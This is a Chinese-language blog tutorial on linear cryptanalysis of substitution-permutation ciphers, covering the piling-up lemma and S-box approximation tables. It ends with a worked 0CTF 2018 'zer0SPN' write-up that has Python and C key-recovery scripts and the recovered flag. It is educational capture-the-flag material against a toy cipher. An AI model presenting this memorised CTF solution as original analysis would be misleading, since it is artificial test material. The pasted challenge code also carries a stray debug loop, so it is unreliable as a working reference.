能够使用线性分析法的环境：线性分析可行一般取决于S盒设计，如果S盒导致出现多个线性表达式成立的概率距离1/2很远，那么最终分析结果将会越好；其次就是密钥长度不要太长，轮次不能太多，否则分析难度将会急剧增加。 2.1 Piling-Up Principle（叠加原理）$$\\begin{equation}P_r(X_1=i)=\\left [ \\begin{array}{lr} p_1, i=0 \\newline 1-p_1, i=1 \\newline \\end{array}\\right]\\\\end{equation}$$ 而$$P_r(X_2=i)=\\left [ \\begin{array} {lr} p_2, i=0 \\newline 1-p_2, i=1 \\newline \\end{array}\\right]$$ 于是有：$$P_r(X_1 \\oplus X_2) = P_r(X_1=X_2)=p_1 p_2 + (1-p_1)(1-p_2)$$令 $p_1=1/2+\\epsilon_1$， $p_2=1/2+\\epsilon_2$ 则有 $P_r(X_1 \\oplus X_2 = 0)=1/2+2\\epsilon_1 \\epsilon_2$ 我们可以简写 $\\epsilon_{1,2} = 2\\epsilon_1 \\epsilon_2$ 根据Piling-Up Lemma (Matsui) ，我们可以快速得到： $P_r(X_1 \\oplus ... \\oplus X_n = 0) = 1/2 + 2^{n-1} \\prod_{i=1} ^n \\epsilon_i$ 如果其中某一个$p_i=1/2$， 那么最终的 $P_r(X_1 \\oplus ... \\oplus X_n = 0) = 1/2$ 假设 $X_1 \\oplus X_2$ 与 $X_2 \\oplus X_3$ 是相互独立的，那么我么有： $P_r(X_1 \\oplus X_3 = 0) = 1/2 +2\\epsilon_{1,2} \\epsilon_{2,3}$ 所以在这种情况下有 $\\epsilon_{1,3} = 2\\epsilon_{1,2} \\epsilon_{2,3}$ 2.2 分析S盒假设S盒输入四位，输出四位，如下图所示： 假设现在使用的查看的是$X_2 \\oplus X_3 \\oplus =Y_1 \\oplus Y_3 \\oplus Y_4$ 我们首先输入16个可能的输入作为X，然后检查对应的可能输出作为Y。我们发现这16个中有12个符合上面的等式。所以上式发生的概率偏差为 $12/16-1/2=1/4$ 假设现在使用的查看的是$X_1 \\oplus X_4 \\oplus =Y_2$ 我们首先输入16个可能的输入作为X，然后检查对应的可能输出作为Y。我们发现这16个中有8个符合上面的等式。所以上式发生的概率偏差为 $8/16-1/2=0$ 上述讲述了通常意义上的方法，那么我们如何运用算法来求解呢？ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import sys# sbox from the tutorialsbox = [0xe, 4, 0xd, 1, 2, 0xf, 0xb, 8, 3, 0xa, 6, 0xc, 5, 9, 0, 7]#sbox = [0xf, 3, 0xa, 6, 4, 1, 0xb, 9, 0xe, 5, 0, 0xd, 2, 0xc, 7, 8]SIZE_SBOX = len(sbox)linear_approx_table = [0]*SIZE_SBOX*SIZE_SBOX# compute the linear approximation for a given &quot;input = output&quot; equationdef linearApprox(input_int, output_int): total = 0 # range over the input for ii in range(SIZE_SBOX): # get input and output of our equations input_masked = ii &amp; input_int output_masked = sbox[ii] &amp; output_int # same result? if (bin(input_masked).count(&quot;1&quot;) - bin(output_masked).count(&quot;1&quot;)) % 2 == 0: total += 1 # get the number of results compared to 8/16 result = total - (SIZE_SBOX//2) if result &gt; 0: result = &quot;+&quot; + str(result) else: result = str(result) return resultdef main(): # rows sys.stdout.write( &quot; | &quot;) for i in range(SIZE_SBOX): sys.stdout.write(str(i).rjust(4) + &quot; &quot;) print &quot;&quot; print &quot; &quot; + &quot;-&quot; * (SIZE_SBOX * 5 + 5) for row in range(SIZE_SBOX): sys.stdout.write(str(row).rjust(4) + &quot; | &quot;) # cols for col in range(SIZE_SBOX): # print the linear approx r = linearApprox(row,col) sys.stdout.write(r.rjust(4) + &quot; &quot;) linear_approx_table[row*SIZE_SBOX+col]=(int(r)) print &quot;&quot; print linear_approx_tableif __name__ == &quot;__main__&quot;: main() 根据上述算法，我们得到下面这张表linear Approximation Table： 我们来讲一讲这张表的含义： Input sum代表的是所有比特位的累加和，output sum表示所有比特位的累加和。而在表中的数字代表的是：输入和的2进制表达式对应的输入与输出和的2进制表达式对应的输出组成的线性表达式，其成立的次数减去所有可能数的一半。 例如：$X_2 \\oplus X_3 \\oplus =Y_1 \\oplus Y_3 \\oplus Y_4$ 对应的就是$(2^2+2^1,2^3+2+2^0)=(6,11)=+4$，概率偏差就是1/4 $X_1 \\oplus X_4 \\oplus =Y_2$ 对应的就是$(2^3+1,2^2)=(9,4)=0$ 其概率偏差为0 几个常用的引理： 任何输出位的线性组合，在遍历ii，求得sbox[ii] &amp; output_sum后，必定具有相同数量的0和1 所有无输出比特的线性组合与所有无输入的线性组合相等，都是1/2，即左上角（0,0）是sbox_size/2，而(0,i)=(i,0)=0， 其中i不为0。 所有行和的绝对值为sbox_size/2，所有列和的绝对值为sbox_size/2。 2.3 引理的证明根据算法，我们可以写出下列表达式 我们首先看一下input_sum确定的情况：$$\\sum_{j=0} ^n \\sum_{i=0} ^n P(output_{mask},input_{mask})=\\sum_{j=0} ^n \\sum_{i=0} ^n P(i \\&amp; input_{sum}, sbox[i] \\&amp; j)= \\sum_{i=0} ^n \\sum_{j=0} ^n P(i \\&amp; input_{sum}, sbox[i] \\&amp; j) = \\sum_{sbox[i]=0} P(i \\&amp; input_{sum}, sbox[i] \\&amp; j) = -sbox_{size}/2 或者 +sbox_{size}/2$$ 0x03 线性分析法整体分析3.1 具体步骤根据上面那种线性分析表格，我们有： $S_{12}: X_1 \\oplus X_3 \\oplus X_4 = Y_2; 概率12/16, 偏差1/4$ $S_{22}: X_2= Y_2 \\oplus Y_4; 概率4/16, 偏差-1/4$ $S_{32}: X_2= Y_2 \\oplus Y_4; 概率4/16, 偏差-1/4$ $S_{34}: X_2= Y_2 \\oplus Y_4; 概率416, 偏差-1/4$ 设 $U_{i,j}(V_{i,j})$ 表示第i轮的16比特中的第j比特输入或输出，$P_i$ 代表16位明文的第i位输入 于是我们有： 第一轮： $V_{1,6} = U_{1,5} \\oplus U_{1,7} \\oplus U_{1,8} = (P_5 \\oplus K_{1,5}) \\oplus (P_7 \\oplus K_{1,7}) \\oplus (P_8 \\oplus K_{1,8})$ (2) 第二轮：$V_{2,6} \\oplus V_{2,8} = U_{2,6} = V_{1,6} \\oplus K_{2,6}$ 带入第一轮的数据，有：$V_{2,6} \\oplus V_{2,8} \\oplus P_5 \\oplus P_7 \\oplus P_8 \\oplus K_{1,5} \\oplus K_{1,7} \\oplus K_{1,8} \\oplus K_{2,6} =0 $ (3) (2)式的概率偏差是1/4，概率为3/4，带入(3)式有其概率为： 1/2+2(3/4-1/2)(1/4-1/2)=3/8 (偏差-1/8) 第三轮：$V_{3,6} \\oplus V_{3,8} = U_{3,6} = V_{2,6} \\oplus K_{3,6}$ $V_{3,14} \\oplus V_{3,16} = U_{3,14} = V_{2,8} \\oplus K_{3,14}$ 带入之后有： $V_{3,6} \\oplus V_{3,8} \\oplus V_{3,14} \\oplus V_{3,16} \\oplus V_{2,6} \\oplus K_{3,6} \\oplus V_{2,8} \\oplus K_{3,14} = 0$ (4) (4)式的概率为 1/2+2(1/4-1/2)(1/4-1/2) = 5/8 (偏差为1/8) 结合(3)、(4)式，我们有： $V_{3,6} \\oplus V_{3,8} \\oplus V_{3,14} \\oplus V_{3,16} \\oplus P_5 \\oplus P_7 \\oplus P_8 \\oplus K_{1,5} \\oplus K_{1,7} \\oplus K_{1,8} \\oplus K_{2,6} \\oplus K_{3,6} \\oplus K_{3,14} = 0$ 第四轮：由$U_{4,6} = V_{3,6} \\oplus K_{4,6}$，$U_{4,8} = V_{3,14} \\oplus K_{4,8}$， $U_{4,14}=V_{3,8} \\oplus K_{4,14}$ ，$U_{4,16} = V_{3,16} \\oplus K_{4,16}$ 我们有：$U_{4,6} \\oplus U_{4,8} \\oplus U_{4,14} \\oplus U_{4,16} \\oplus P_5 \\oplus P_7 \\oplus P_8 \\oplus \\sum_K = 0$ 其中：$\\sum_K = K_{1,5} \\oplus K_{1,7} \\oplus K_{1,8} \\oplus K_{2,6} \\oplus K_{3,6} \\oplus K_{3,14} \\oplus K_{4,6} \\oplus K_{4,8} \\oplus K_{4,14} \\oplus K_{4,16}$ 其中$\\sum_K$ 的值为0或1，并且由叠加原理，有其概率为 $1/2+2^3(3/4-1/2)(1/4-1/2)^3=15/32$ （偏差-1/32） $U_{4,6} \\oplus U_{4,8} \\oplus U_{4,14} \\oplus U_{4,16} \\oplus P_5 \\oplus P_7 \\oplus P_8 = 0$ （5） 第5轮： 3.2 获取Key的各比特位的值上面之所以不进行第5轮的计算，是因为若R-1轮线性分析后，从密文反推会更为容易。 对于给出对应位置的部分目标子密钥$[K_{5,5} ... K_{5,8}, K_{5,13} ... K_{5,16}]$，解密出对应的密文得到$[V_{4,5} ... V_{4,8}, V_{4,13} ... V_{4,16}]$。通过S和的逆变换，我们可以求解出$[U_{4,5} ... U_{4,8}, U_{4,13} ... U_{4,16}]$ 。然后依据（5）式，可以算出符合该线性表达式的次数。 之所以可以使用这种方法，是因为如果部分目标子密钥正确，那么（5）式成立的概率将会与1/2有很大不同。而其他不正确的子密钥，将会造成（5）式概率接近于1/2。 (5)式影响S盒$S_{42}$ 和 $S_{44}$ 的输入。对于每对明密文对，我们将会尝试256种可能的部分目标子密钥$[K_{5,5} ... K_{5,8}, K_{5,13} ... K_{5,16}]$ 。对于每种可能的部分子密钥，我们都会求出(5)式为真时的次数。这些次数偏离最远的就是正确的解，当然不用管这些次数是正向偏移还是逆向偏移（其取决于$\\sum_K$）。 当$\\sum_K=0$ 时，（5）式成立的概率 &lt; 1/2 当$\\sum_K=1$ 时，（5）式成立的概率 &gt; 1/2 我们测试了10000组已知明密文对，用下列公式计算偏移： $|bias| = |count - 5000|/10000$ 最终得到下面的表格： 根据表格可以看出$[K_{5,5} ... K_{5,8}]=0010, [K_{5,13} ... K_{5,16}]=0100$ 时，偏移概率最大，为0.0336。其实1/32=0.03125。注意到这些之后，我们可以肯定这两部分的密钥值就是这些。 而直到这两部分的值之后，我们完全可以爆破求解另外两部分的密钥（如果密钥是可以反向求解的！） 3.3 攻击的复杂度成功原因：如果S盒偏差越大，线性分析的偏差也会越大。 设$\\epsilon$ 为线性表达式距离1/2的偏差，Matsui表示要使攻击成功，那么已知明文的数量要与$\\epsilon^-2$ 的数量成正比。 如果$N_L$ 表示线性表达式需要的已知明文数量，则有 $N_L \\approx 1/\\epsilon^2$ 由于偏差使用线性叠加的方式来计算的，所以很容易看出偏差依赖于S盒的线性近似表达式和触发的S盒数量。 0x04 范例既然讲到了线性分析法，那么我们就必须使用其进行解题。下面是2018 0ctf的一道题，zer0SPN zer0SPN.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133#!/usr/bin/env python# coding=utf-8#from secret import secretrcon = [0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36, 0x6c, 0xd8, 0xab, 0x4d, 0x9a]sbox = [62, 117, 195, 179, 20, 210, 41, 66, 116, 178, 152, 143, 75, 105, 254, 1, 158, 95, 101, 175, 191, 166, 36, 24, 50, 39, 190, 120, 52, 242, 182, 185, 61, 225, 140, 38, 150, 80, 19, 109, 246, 252, 40, 13, 65, 236, 124, 186, 214, 86, 235, 100, 97, 49, 197, 154, 176, 199, 253, 69, 88, 112, 139, 77, 184, 45, 133, 104, 15, 54, 177, 244, 160, 169, 82, 148, 73, 30, 229, 35, 79, 137, 157, 180, 248, 163, 241, 231, 81, 94, 165, 9, 162, 233, 18, 85, 217, 84, 7, 55, 63, 171, 56, 118, 237, 132, 136, 22, 90, 221, 103, 161, 205, 11, 255, 14, 122, 47, 71, 201, 99, 220, 83, 74, 173, 76, 144, 16, 155, 126, 60, 96, 44, 234, 17, 215, 107, 138, 159, 183, 251, 3, 198, 0, 89, 170, 131, 151, 219, 29, 230, 32, 187, 125, 134, 64, 12, 202, 164, 247, 25, 223, 222, 119, 174, 67, 147, 146, 206, 51, 243, 53, 121, 239, 68, 130, 70, 203, 211, 111, 108, 113, 8, 106, 57, 240, 21, 93, 142, 238, 167, 5, 128, 72, 189, 192, 193, 92, 10, 204, 87, 145, 188, 172, 224, 226, 207, 27, 218, 48, 33, 28, 123, 6, 37, 59, 4, 102, 114, 91, 23, 209, 34, 42, 2, 196, 141, 208, 181, 245, 43, 78, 213, 216, 232, 46, 98, 26, 212, 58, 115, 194, 200, 129, 227, 249, 127, 149, 135, 228, 31, 153, 250, 156, 168, 110]ptable = [ 0, 8, 16, 24, 32, 40, 48, 56, 1, 9, 17, 25, 33, 41, 49, 57, 2, 10, 18, 26, 34, 42, 50, 58, 3, 11, 19, 27, 35, 43, 51, 59, 4, 12, 20, 28, 36, 44, 52, 60, 5, 13, 21, 29, 37, 45, 53, 61, 6, 14, 22, 30, 38, 46, 54, 62, 7, 15, 23, 31, 39, 47, 55, 63]sbox_inv = [143, 15, 224, 141, 216, 191, 213, 98, 182, 91, 198, 113, 156, 43, 115, 68, 127, 134, 94, 38, 4, 186, 107, 220, 23, 160, 237, 207, 211, 149, 77, 250, 151, 210, 222, 79, 22, 214, 35, 25, 42, 6, 223, 230, 132, 65, 235, 117, 209, 53, 24, 169, 28, 171, 69, 99, 102, 184, 239, 215, 130, 32, 0, 100, 155, 44, 7, 165, 174, 59, 176, 118, 193, 76, 123, 12, 125, 63, 231, 80, 37, 88, 74, 122, 97, 95, 49, 200, 60, 144, 108, 219, 197, 187, 89, 17, 131, 52, 236, 120, 51, 18, 217, 110, 67, 13, 183, 136, 180, 39, 255, 179, 61, 181, 218, 240, 8, 1, 103, 163, 27, 172, 116, 212, 46, 153, 129, 246, 192, 243, 175, 146, 105, 66, 154, 248, 106, 81, 137, 62, 34, 226, 188, 11, 126, 201, 167, 166, 75, 247, 36, 147, 10, 251, 55, 128, 253, 82, 16, 138, 72, 111, 92, 85, 158, 90, 21, 190, 254, 73, 145, 101, 203, 124, 164, 19, 56, 70, 9, 3, 83, 228, 30, 139, 64, 31, 47, 152, 202, 194, 26, 20, 195, 196, 241, 2, 225, 54, 142, 57, 242, 119, 157, 177, 199, 112, 168, 206, 227, 221, 5, 178, 238, 232, 48, 135, 233, 96, 208, 148, 121, 109, 162, 161, 204, 33, 205, 244, 249, 78, 150, 87, 234, 93, 133, 50, 45, 104, 189, 173, 185, 86, 29, 170, 71, 229, 40, 159, 84, 245, 252, 140, 41, 58, 14, 114]def s2b(s): return map(int, format(int(str(s).encode('hex'), 16), '0&#123;&#125;b'.format(8*len(s))))def b2s(b): return bytearray.fromhex(format(reduce(lambda x,y: 2*x+y, b), '0&#123;&#125;x'.format(len(b)/4)))def addkey(a, b): global flag return bytearray(i^j for i,j in zip(a, b))def substitute(a): return bytearray(sbox[i] for i in a)def permutation(a): assert len(a) == 8 bits = s2b(a) bits = [bits[ptable[i]] for i in xrange(64)] return b2s(bits)def substitute_inv(a): return bytearray(sbox_inv[i] for i in a)class zer0SPN(object): '''0ops Substitution–Permutation Network''' def __init__(self, key, key_size=8, rounds=4): assert len(key) == key_size self.key = key self.key_size = key_size self.rounds = rounds self.key_schedule() def key_schedule(self): roundkey = bytearray(self.key) tmp = roundkey[-4:] for i in xrange(1, self.rounds+1): tmp = tmp[1:] + tmp[:1] tmp = bytearray(sbox[i] for i in tmp) tmp[0] ^= rcon[i] for j in range(self.key_size/4): for k in range(4): tmp[k] ^= roundkey[-self.key_size+k] roundkey += tmp self.roundkey = roundkey def get_roundkey(self, k): assert k &lt;= self.rounds return self.roundkey[self.key_size*k:self.key_size*(k+1)] def encrypt(self, plain): assert len(plain) == self.key_size block = bytearray(plain) for i in xrange(self.rounds): block = addkey(block, self.get_roundkey(i)) block = substitute(block) if i != self.rounds - 1: # Permutation in the last round is of no purpose. block = permutation(block) block = addkey(block, self.get_roundkey(i+1)) return blockdef key_schedule(key): rounds = 4 key_size = 8 roundkey = bytearray(key) tmp = roundkey[-4:] for i in xrange(1, rounds+1): tmp = tmp[1:] + tmp[:1] tmp = bytearray(sbox[i] for i in tmp) tmp[0] ^= rcon[i] for j in range(key_size/4): for k in range(4): tmp[k] ^= roundkey[-key_size+k] roundkey += tmp roundkey = roundkey return roundkeydef key_schedule_inv(last_key): rounds = 4 key_size = 8 roundkey = bytearray(last_key) for i in xrange(rounds, 0, -1): tmp = roundkey[4:8] for k in range(0,4): tmp[k] ^= roundkey[k] roundkey = tmp+roundkey tmp = roundkey[0:4] tmp = tmp[1:] + tmp[:1] tmp = bytearray(sbox[i] for i in tmp) tmp[0] ^= rcon[i] for k in range(0,4): tmp[k] ^= roundkey[4+k] roundkey = tmp + roundkey roundkey = roundkey return roundkeyfor i in range(255): print sbox[i]^sbox[i+1]exit(0)if __name__ == '__main__': from os import urandom from struct import pack import binascii print \"Your flag is flag&#123;%s&#125;\" % secret.encode('hex') f = open('data', 'wb') for _ in xrange(65536): c = zer0SPN(secret) plaintext = bytearray(urandom(8)) f.write(pack('8B', *plaintext)) ciphertext = c.encrypt(plaintext) f.write(pack('8B', *ciphertext)) f.close() 使用下面脚本获取S盒的缺陷表达式：(find_linear_approxmation) 1234567for insum in xrange(256): for outsum in xrange(256): if insum&amp;(insum-1) and outsum&amp;(outsum-1): continue bias = sum((bin(x&amp;insum).count('1') + bin(sbox[x]&amp;outsum).count('1')) % 2 for x in xrange(256)) - 128 if abs(bias) &gt; 40: print '+'.join(['X'+str(i) for i in xrange(8) if insum&amp;(2**i)] + ['Y'+str(i) for i in xrange(8) if outsum&amp;(2**i)]) 得到: 12345678910111213141516X0+Y0+Y1+Y2+Y7X1+Y0+Y1+Y3+Y4+Y7X2+Y0+Y1+Y2+Y3+Y4+Y6+Y7X3+Y1+Y4+Y5+Y7X4+Y0+Y2+Y4+Y5+Y6X0+X3+X4+Y6X0+X1+X2+X3+X4+Y2X5+Y0+Y1+Y2+Y3+Y4X0+X2+X3+X4+X5+Y7X6+Y1+Y7X1+X2+X3+X4+X6+Y0X0+X2+X3+X4+X5+X6+Y1X7+Y0+Y4X1+X2+X4+X7+Y5X1+X6+X7+Y3X1+X2+X3+X4+X6+X7+Y4 然后我们来获得到第四轮时的表达式（未亦或）：(这里选择性地用了几组开始数据) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990import sympyrcon = [0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36, 0x6c, 0xd8, 0xab, 0x4d, 0x9a]sbox = [62, 117, 195, 179, 20, 210, 41, 66, 116, 178, 152, 143, 75, 105, 254, 1, 158, 95, 101, 175, 191, 166, 36, 24, 50, 39, 190, 120, 52, 242, 182, 185, 61, 225, 140, 38, 150, 80, 19, 109, 246, 252, 40, 13, 65, 236, 124, 186, 214, 86, 235, 100, 97, 49, 197, 154, 176, 199, 253, 69, 88, 112, 139, 77, 184, 45, 133, 104, 15, 54, 177, 244, 160, 169, 82, 148, 73, 30, 229, 35, 79, 137, 157, 180, 248, 163, 241, 231, 81, 94, 165, 9, 162, 233, 18, 85, 217, 84, 7, 55, 63, 171, 56, 118, 237, 132, 136, 22, 90, 221, 103, 161, 205, 11, 255, 14, 122, 47, 71, 201, 99, 220, 83, 74, 173, 76, 144, 16, 155, 126, 60, 96, 44, 234, 17, 215, 107, 138, 159, 183, 251, 3, 198, 0, 89, 170, 131, 151, 219, 29, 230, 32, 187, 125, 134, 64, 12, 202, 164, 247, 25, 223, 222, 119, 174, 67, 147, 146, 206, 51, 243, 53, 121, 239, 68, 130, 70, 203, 211, 111, 108, 113, 8, 106, 57, 240, 21, 93, 142, 238, 167, 5, 128, 72, 189, 192, 193, 92, 10, 204, 87, 145, 188, 172, 224, 226, 207, 27, 218, 48, 33, 28, 123, 6, 37, 59, 4, 102, 114, 91, 23, 209, 34, 42, 2, 196, 141, 208, 181, 245, 43, 78, 213, 216, 232, 46, 98, 26, 212, 58, 115, 194, 200, 129, 227, 249, 127, 149, 135, 228, 31, 153, 250, 156, 168, 110]ptable = [ 0, 8, 16, 24, 32, 40, 48, 56, 1, 9, 17, 25, 33, 41, 49, 57, 2, 10, 18, 26, 34, 42, 50, 58, 3, 11, 19, 27, 35, 43, 51, 59, 4, 12, 20, 28, 36, 44, 52, 60, 5, 13, 21, 29, 37, 45, 53, 61, 6, 14, 22, 30, 38, 46, 54, 62, 7, 15, 23, 31, 39, 47, 55, 63]sbox_inv = [143, 15, 224, 141, 216, 191, 213, 98, 182, 91, 198, 113, 156, 43, 115, 68, 127, 134, 94, 38, 4, 186, 107, 220, 23, 160, 237, 207, 211, 149, 77, 250, 151, 210, 222, 79, 22, 214, 35, 25, 42, 6, 223, 230, 132, 65, 235, 117, 209, 53, 24, 169, 28, 171, 69, 99, 102, 184, 239, 215, 130, 32, 0, 100, 155, 44, 7, 165, 174, 59, 176, 118, 193, 76, 123, 12, 125, 63, 231, 80, 37, 88, 74, 122, 97, 95, 49, 200, 60, 144, 108, 219, 197, 187, 89, 17, 131, 52, 236, 120, 51, 18, 217, 110, 67, 13, 183, 136, 180, 39, 255, 179, 61, 181, 218, 240, 8, 1, 103, 163, 27, 172, 116, 212, 46, 153, 129, 246, 192, 243, 175, 146, 105, 66, 154, 248, 106, 81, 137, 62, 34, 226, 188, 11, 126, 201, 167, 166, 75, 247, 36, 147, 10, 251, 55, 128, 253, 82, 16, 138, 72, 111, 92, 85, 158, 90, 21, 190, 254, 73, 145, 101, 203, 124, 164, 19, 56, 70, 9, 3, 83, 228, 30, 139, 64, 31, 47, 152, 202, 194, 26, 20, 195, 196, 241, 2, 225, 54, 142, 57, 242, 119, 157, 177, 199, 112, 168, 206, 227, 221, 5, 178, 238, 232, 48, 135, 233, 96, 208, 148, 121, 109, 162, 161, 204, 33, 205, 244, 249, 78, 150, 87, 234, 93, 133, 50, 45, 104, 189, 173, 185, 86, 29, 170, 71, 229, 40, 159, 84, 245, 252, 140, 41, 58, 14, 114]def s2b(s): return map(int, format(int(str(s).encode('hex'), 16), '0&#123;&#125;b'.format(8*len(s))))def b2s(b): return bytearray.fromhex(format(reduce(lambda x,y: 2*x+y, b), '0&#123;&#125;x'.format(len(b)/4)))def addkey(a, b): global flag return bytearray(i^j for i,j in zip(a, b))def substitute(a): return bytearray(sbox[i] for i in a)def permutation(a): assert len(a) == 8 bits = s2b(a) bits = [bits[ptable[i]] for i in xrange(64)] return b2s(bits)def substitute_inv(a): return bytearray(sbox_inv[i] for i in a)# Some precomputations of the P-box to use (byte,bit) indexingpt = [[None for i in xrange(8)] for j in xrange(8)]for i in xrange(8): for j in xrange(8): c = bytearray('\\0'*8) c[i] = chr(2**j) d = permutation(c) i2 = None for k in xrange(8): if d[k] != 0: assert i2 is None i2 = k j2 = None for k in xrange(8): if (d[i2]&amp;(2**k)) != 0: assert j2 is None j2 = k pt[i][j] = (i2,j2)K = sympy.IndexedBase('K')P = sympy.IndexedBase('P')U4 = sympy.IndexedBase('U4')def k(i, j, b): # not interested in which key bits are involved return 0def p(i, b): # plain-text bits return P[i, b]def u(i, j, b): if i == 4: # this is the input of the last S-box, leave it as it is return U4[j, b] # These numbers are from the S-box biases where there is only a single input bit involved, map them to output bits return sum(map(lambda x: v(i, j, x), [[0,1,2,7], [0,1,3,4,7], [0,1,2,3,4,6,7], [1,4,5,7], [0,2,4,5,6], [0,1,2,3,4], [1,7], [0,4]][b]))def v(i, j, b): # From the output of an S-box we can get to the input of the next S-box by using the permutations (and some key bits) return k(i+1, pt[j][b][0], pt[j][b][1])+u(i+1, pt[j][b][0], pt[j][b][1])def x(i): # Input of the first S-box is the plaintext bit ^ a key bit return p(0, i)+k(1, 0, i)def y(i): # Output of the first S-box return v(1, 0, i)print x(1)+x(2)+x(3)+x(4)+x(6)+y(0)print x(0)+x(2)+x(3)+x(4)+x(5)+x(6)+y(1)print x(0)+x(1)+x(2)+x(3)+x(4)+y(2)print x(1)+x(6)+x(7)+y(3)print x(1)+x(2)+x(3)+x(4)+x(6)+x(7)+y(4)print x(1)+x(2)+x(4)+x(7)+y(5)print x(0)+x(3)+x(4)+y(6)print x(0)+x(2)+x(3)+x(4)+x(5)+y(7) 获得表达式： 12345678P[0, 1] + P[0, 2] + P[0, 3] + P[0, 4] + P[0, 6] + U4[0, 0] + U4[0, 4] + U4[5, 0] + U4[5, 4] + U4[6, 0] + U4[6, 4] + U4[7, 0] + U4[7, 4]P[0, 0] + P[0, 2] + P[0, 3] + P[0, 4] + P[0, 5] + P[0, 6] + U4[0, 0] + U4[0, 4] + U4[3, 0] + U4[3, 4] + U4[4, 0] + U4[4, 4] + U4[6, 0] + U4[6, 4] + U4[7, 0] + U4[7, 4]P[0, 0] + P[0, 1] + P[0, 2] + P[0, 3] + P[0, 4] + U4[0, 0] + U4[0, 4] + U4[1, 0] + U4[1, 4] + U4[3, 0] + U4[3, 4] + U4[4, 0] + U4[4, 4] + U4[5, 0] + U4[5, 4] + U4[6, 0] + U4[6, 4] + U4[7, 0] + U4[7, 4]P[0, 1] + P[0, 6] + P[0, 7] + U4[0, 0] + U4[0, 4] + U4[2, 0] + U4[2, 4] + U4[3, 0] + U4[3, 4] + U4[6, 0] + U4[6, 4]P[0, 1] + P[0, 2] + P[0, 3] + P[0, 4] + P[0, 6] + P[0, 7] + U4[1, 0] + U4[1, 4] + U4[2, 0] + U4[2, 4] + U4[3, 0] + U4[3, 4] + U4[5, 0] + U4[5, 4] + U4[7, 0] + U4[7, 4]P[0, 1] + P[0, 2] + P[0, 4] + P[0, 7] + U4[3, 0] + U4[3, 4] + U4[4, 0] + U4[4, 4] + U4[5, 0] + U4[5, 4] + U4[6, 0] + U4[6, 4] + U4[7, 0] + U4[7, 4]P[0, 0] + P[0, 3] + P[0, 4] + U4[0, 0] + U4[0, 4] + U4[6, 0] + U4[6, 4]P[0, 0] + P[0, 2] + P[0, 3] + P[0, 4] + P[0, 5] + U4[3, 0] + U4[3, 4] + U4[7, 0] + U4[7, 4] 最后我们看看上面的表达式，我们能够爆破的只有两个字节，因此应该选择合适的表达式进行展开。 由于性能的要求，这里使用的是c语言（这里用的是倒数第2个表达式）： 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;int sbox_inv[256] = &#123;143, 15, 224, 141, 216, 191, 213, 98, 182, 91, 198, 113, 156, 43, 115, 68, 127, 134, 94, 38, 4, 186, 107, 220, 23, 160, 237, 207, 211, 149, 77, 250, 151, 210, 222, 79, 22, 214, 35, 25, 42, 6, 223, 230, 132, 65, 235, 117, 209, 53, 24, 169, 28, 171, 69, 99, 102, 184, 239, 215, 130, 32, 0, 100, 155, 44, 7, 165, 174, 59, 176, 118, 193, 76, 123, 12, 125, 63, 231, 80, 37, 88, 74, 122, 97, 95, 49, 200, 60, 144, 108, 219, 197, 187, 89, 17, 131, 52, 236, 120, 51, 18, 217, 110, 67, 13, 183, 136, 180, 39, 255, 179, 61, 181, 218, 240, 8, 1, 103, 163, 27, 172, 116, 212, 46, 153, 129, 246, 192, 243, 175, 146, 105, 66, 154, 248, 106, 81, 137, 62, 34, 226, 188, 11, 126, 201, 167, 166, 75, 247, 36, 147, 10, 251, 55, 128, 253, 82, 16, 138, 72, 111, 92, 85, 158, 90, 21, 190, 254, 73, 145, 101, 203, 124, 164, 19, 56, 70, 9, 3, 83, 228, 30, 139, 64, 31, 47, 152, 202, 194, 26, 20, 195, 196, 241, 2, 225, 54, 142, 57, 242, 119, 157, 177, 199, 112, 168, 206, 227, 221, 5, 178, 238, 232, 48, 135, 233, 96, 208, 148, 121, 109, 162, 161, 204, 33, 205, 244, 249, 78, 150, 87, 234, 93, 133, 50, 45, 104, 189, 173, 185, 86, 29, 170, 71, 229, 40, 159, 84, 245, 252, 140, 41, 58, 14, 114&#125;;int cnt[256][256];int bit(int n, int k)&#123; return (n &amp; (1 &lt;&lt; k)) != 0;&#125;int main()&#123; auto f = fopen(\"data\", \"rb\"); for (int i = 0; i &lt; 65536; i++) &#123; uint8_t p[8], c[8]; fread(&amp;p, 8, 1, f); fread(&amp;c, 8, 1, f); for (int a = 0; a &lt; 256; a++) &#123; for (int b = 0; b &lt; 256; b++) &#123; int u4b0 = sbox_inv[(int)c[0] ^ a], u4b6 = sbox_inv[(int)c[6] ^ b]; if (bit(p[0], 0) ^ bit(p[0], 3) ^ bit(p[0], 4) ^ bit(u4b0, 0) ^ bit(u4b0, 4) ^ bit(u4b6, 0) ^ bit(u4b6, 4)) &#123; cnt[a][b]++; &#125; &#125; &#125; &#125; for (int a = 0; a &lt; 256; a++) &#123; for (int b = 0; b &lt; 256; b++) &#123; int bias = abs(cnt[a][b] - 32768); if (bias &gt; 1000) cout &lt;&lt; a &lt;&lt; \" \" &lt;&lt; b &lt;&lt; \" \" &lt;&lt; bias &lt;&lt; endl; &#125; &#125;&#125; 结果为： 123456130 103 1068130 118 1044130 194 2220130 196 1111130 213 1068149 194 1045 于是我们可以认为最后1轮中，第0字节为130，第6个字节是194。 当然我们可用类似的办法求出另外一些字节： 1234567891011def inv(rnd, r5): r4b = bytearray(r5[i]^r5[4+i] for i in xrange(4)) r4a = bytearray(r5[i]^sbox[r4b[(i+1)%4]] ^ (rcon[rnd] if i == 0 else 0) for i in xrange(4)) return r4a + r4br5 = bytearray([130, 167, 150, 65, 235, 239, 194, 40])r4 = inv(4, r5)r3 = inv(3, r4)r2 = inv(2, r3)r1 = inv(1, r2)print &apos;flag&#123;%s&#125;&apos;%(str(r1).encode(&apos;hex&apos;)) 最终的flag为flag{48667ec1a5fb3383} 0x05 引用https://www.engr.mun.ca/~howard/PAPERS/ldc_tutorial.pdf https://gist.github.com/ngg/f534e51c14a832d69c41289837078773","tags":[{"name":"spn","slug":"spn","permalink":"http://yoursite.com/tags/spn/"}]},{"title":"RSA Least-Significant-Bit Oracle 